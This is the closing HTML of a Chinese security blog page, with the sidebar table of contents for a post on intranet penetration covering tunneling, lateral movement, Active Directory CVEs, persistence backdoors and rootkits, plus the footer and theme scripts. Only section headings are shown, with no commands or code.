href="#%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95AD"><span class="toc-number">1.1.4.</span> <span class="toc-text">活动目录AD</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8DC"><span class="toc-number">1.1.5.</span> <span class="toc-text">域控制器DC</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F"><span class="toc-number">1.2.</span> <span class="toc-text">域</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A4%E7%9F%A5"><span class="toc-number">1.3.</span> <span class="toc-text">认知</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%9E%B6%E6%9E%84"><span class="toc-number">2.</span> <span class="toc-text">基本架构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="toc-number">3.</span> <span class="toc-text">隧道技术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SOCKS%E4%BB%A3%E7%90%86"><span class="toc-number">3.1.</span> <span class="toc-text">SOCKS代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F"><span class="toc-number">3.2.</span> <span class="toc-text">内网穿透</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93"><span class="toc-number">3.2.1.</span> <span class="toc-text">代理隧道</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">4.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">4.1.</span> <span class="toc-text">基本信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E5%86%85%E5%87%AD%E6%8D%AE%E6%94%B6%E9%9B%86"><span class="toc-number">4.2.</span> <span class="toc-text">对内凭据收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E5%A4%96%E6%89%93%E7%82%B9"><span class="toc-number">4.3.</span> <span class="toc-text">对外打点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AD%E5%9F%9F%E7%8E%AF%E5%A2%83"><span class="toc-number">4.4.</span> <span class="toc-text">AD域环境</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">5.</span> <span class="toc-text">横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%A5%E5%8F%A3%E5%B7%AE%E5%BC%82"><span class="toc-number">5.1.</span> <span class="toc-text">入口差异</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E5%A4%96"><span class="toc-number">5.1.1.</span> <span class="toc-text">域外</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E5%86%85"><span class="toc-number">5.1.2.</span> <span class="toc-text">域内</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E5%8F%A3%E4%BB%A4%E5%87%AD%E8%AF%81"><span class="toc-number">5.2.</span> <span class="toc-text">基于口令凭证</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IPC"><span class="toc-number">5.2.1.</span> <span class="toc-text">IPC</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WMI"><span class="toc-number">5.2.2.</span> <span class="toc-text">WMI</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SMB"><span class="toc-number">5.2.3.</span> <span class="toc-text">SMB</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DCOM"><span class="toc-number">5.2.4.</span> <span class="toc-text">DCOM</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#winrs-winrm"><span class="toc-number">5.2.5.</span> <span class="toc-text">winrs&amp;winrm</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#rdp"><span class="toc-number">5.2.6.</span> <span class="toc-text">rdp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%BC%E5%90%88%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7"><span class="toc-number">5.2.7.</span> <span class="toc-text">综合测试工具</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pth%EF%BC%88%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB%EF%BC%89"><span class="toc-number">5.2.8.</span> <span class="toc-text">pth（哈希传递攻击）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ptt%EF%BC%88%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB%EF%BC%89"><span class="toc-number">5.2.9.</span> <span class="toc-text">ptt（票据传递攻击）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ptk%EF%BC%88%E5%AF%86%E9%92%A5%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB%EF%BC%89"><span class="toc-number">5.2.10.</span> <span class="toc-text">ptk（密钥传递攻击）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%BC%8F%E6%B4%9E"><span class="toc-number">5.3.</span> <span class="toc-text">基于漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#NTML-Relay"><span class="toc-number">5.3.1.</span> <span class="toc-text">NTML Relay</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E"><span class="toc-number">5.3.2.</span> <span class="toc-text">域控提权漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#CVE-2020-1472"><span class="toc-number">5.3.2.1.</span> <span class="toc-text">CVE-2020-1472</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CVE-2021-42287"><span class="toc-number">5.3.2.2.</span> <span class="toc-text">CVE-2021-42287</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CVE-2022-26923"><span class="toc-number">5.3.2.3.</span> <span class="toc-text">CVE-2022-26923</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CVE-2017-0146"><span class="toc-number">5.3.2.4.</span> <span class="toc-text">CVE-2017-0146</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Exchange%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E"><span class="toc-number">5.3.3.</span> <span class="toc-text">Exchange服务漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E9%85%8D%E7%BD%AE"><span class="toc-number">5.4.</span> <span class="toc-text">基于配置</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A7%94%E6%B4%BE"><span class="toc-number">5.4.1.</span> <span class="toc-text">委派</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-number">5.4.1.1.</span> <span class="toc-text">非约束委派</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-number">5.4.1.2.</span> <span class="toc-text">约束委派</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-number">5.4.1.3.</span> <span class="toc-text">基于资源的约束委派</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%90%8C%E7%94%A8%E6%88%B7%E4%B8%8D%E5%90%8C%E6%9C%BA%E5%99%A8"><span class="toc-number">5.4.1.3.1.</span> <span class="toc-text">同用户不同机器</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Acount-Operators%E7%BB%84%E7%94%A8%E6%88%B7"><span class="toc-number">5.4.1.3.2.</span> <span class="toc-text">Acount Operators组用户</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%BB%93%E5%90%88HTLMRelay"><span class="toc-number">5.4.1.3.3.</span> <span class="toc-text">结合HTLMRelay</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dysnc"><span class="toc-number">5.4.2.</span> <span class="toc-text">dysnc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#asreo"><span class="toc-number">5.4.3.</span> <span class="toc-text">asreo</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#kerberos"><span class="toc-number">5.4.4.</span> <span class="toc-text">kerberos</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E4%BD%9C%E7%BB%84-1"><span class="toc-number">5.5.</span> <span class="toc-text">工作组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux"><span class="toc-number">5.6.</span> <span class="toc-text">Linux</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">6.</span> <span class="toc-text">权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91AD%E5%9F%9F"><span class="toc-number">6.1.</span> <span class="toc-text">内网AD域</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SSP%E6%B3%A8%E5%85%A5"><span class="toc-number">6.1.1.</span> <span class="toc-text">SSP注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SID%E5%8E%86%E5%8F%B2%E5%90%8E%E9%97%A8"><span class="toc-number">6.1.2.</span> <span class="toc-text">SID历史后门</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Skeleton%E9%92%A5%E5%8C%99"><span class="toc-number">6.1.3.</span> <span class="toc-text">Skeleton钥匙</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DSRM%E8%BF%98%E5%8E%9F%E5%90%8E%E9%97%A8"><span class="toc-number">6.1.4.</span> <span class="toc-text">DSRM还原后门</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A5%A8%E6%8D%AE"><span class="toc-number">6.1.5.</span> <span class="toc-text">票据</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">6.1.5.1.</span> <span class="toc-text">黄金票据</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="toc-number">6.1.5.2.</span> <span class="toc-text">白银票据</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%92%BB%E7%9F%B3%E7%A5%A8%E6%8D%AE"><span class="toc-number">6.1.5.3.</span> <span class="toc-text">钻石票据</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%93%9D%E5%AE%9D%E7%9F%B3%E7%A5%A8%E6%8D%AE"><span class="toc-number">6.1.5.4.</span> <span class="toc-text">蓝宝石票据</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B7%AE%E5%BC%82"><span class="toc-number">6.1.6.</span> <span class="toc-text">差异</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows%E4%B8%BB%E6%9C%BA%E5%90%8E%E9%97%A8"><span class="toc-number">6.2.</span> <span class="toc-text">Windows主机后门</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%87%AA%E5%90%AF%E5%8A%A8"><span class="toc-number">6.2.1.</span> <span class="toc-text">自启动</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8"><span class="toc-number">6.2.2.</span> <span class="toc-text">粘滞键后门</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%98%A0%E5%83%8F%E5%8A%AB%E6%8C%81"><span class="toc-number">6.2.3.</span> <span class="toc-text">文件映像劫持</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E5%AE%83"><span class="toc-number">6.2.4.</span> <span class="toc-text">其它</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux-1"><span class="toc-number">6.3.</span> <span class="toc-text">Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#OpenSSH%E5%90%8E%E9%97%A8"><span class="toc-number">6.3.1.</span> <span class="toc-text">OpenSSH后门</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PAM%E5%90%AF%E7%94%A8%E6%9B%BF%E6%8D%A2"><span class="toc-number">6.3.2.</span> <span class="toc-text">PAM启用替换</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%86%E9%92%A5%E5%AF%B9"><span class="toc-number">6.3.3.</span> <span class="toc-text">密钥对</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8E%E9%97%A8%E8%B4%A6%E5%8F%B7"><span class="toc-number">6.3.4.</span> <span class="toc-text">后门账号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cron%E5%90%8E%E9%97%A8"><span class="toc-number">6.3.5.</span> <span class="toc-text">Cron后门</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Rootkit%E5%90%8E%E9%97%A8"><span class="toc-number">7.</span> <span class="toc-text">Rootkit后门</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Window"><span class="toc-number">7.1.</span> <span class="toc-text">Window</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux-2"><span class="toc-number">7.2.</span> <span class="toc-text">Linux</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/09/10/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="代码审计">代码审计</a><time datetime="2024-09-10T15:11:57.000Z" title="Created 2024-09-10 23:11:57">2024-09-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/09/10/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" title="内网安全">内网安全</a><time datetime="2024-09-10T14:48:15.981Z" title="Created 2024-09-10 22:48:15">2024-09-10</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By Jw1ng</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>